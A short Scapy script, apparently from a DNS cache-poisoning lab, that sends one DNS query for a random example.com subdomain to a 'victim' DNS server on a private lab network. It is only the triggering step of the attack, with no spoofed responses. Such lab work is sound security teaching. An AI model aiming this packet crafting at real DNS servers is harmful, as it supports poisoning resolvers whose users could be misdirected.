from scapy.all import *
"""
import random
import string

def generate_random_subdomain(length=5):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
subdomain = generate_random_subdomain()
random_hostname =subdomain + '.example.com'
"""
# Parameters
victim_dns_server = '10.9.0.53'        # IP of the victim's DNS server
random_hostname = 'twysw.example.com'  # Random hostname for attack
src_port = 55555                       # Source port for UDP packet
dest_port = 53                         # DNS uses port 53

Qdsec = DNSQR(qname=random_hostname)                                         # Create DNS query
dns = DNS(id=0xAAAA,qr=0,qdcount=1,ancount=0,nscount=0,arcount=0,qd=Qdsec)   # Create DNS packet

ip = IP(dst=victim_dns_server, src="10.9.0.1")                               # Attacker ip -> Victim's DNS server ip
udp = UDP(dport=dest_port, sport=src_port)                                   # UDP header
request = ip / udp / dns                                                     # Full request packet

send(request)                          # Send packet
